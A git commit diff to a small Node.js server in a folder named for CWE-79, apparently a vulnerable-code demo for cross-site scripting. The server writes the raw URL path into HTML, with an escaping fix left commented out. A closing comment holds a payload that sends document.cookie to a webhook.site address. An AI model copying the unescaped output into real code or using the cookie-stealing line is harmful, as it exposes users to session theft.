409f9f1961450f6539d03f7e25f9719abe278001
fturanzero <60838036+fturanzero@users.noreply.github.com>
2020-11-16 17:42:28 +0300

    Update index.js

--- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')/index.js
+++ CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')/index.js
@@ -1,8 +1,9 @@
 var http = require('http');
 
 http.createServer(function (req, res) {
-  res.write('<html><h1>' + decodeURI(req.url).slice(1) + '</h1></html>'); 
+	//var encodedStr = decodeURI(req.url).slice(1).replace(/[\u00A0-\u9999<>\&]/g, function(i) {return '&#'+i.charCodeAt(0)+';';});
+	res.write('<html><h1>' + decodeURI(req.url).slice(1) + '</h1></html>'); 
+	res.end();
 }).listen(8080); 
-
 
 //document.write('<img src="https://webhook.site/<path>?cookie=' + document.cookie + '" />')
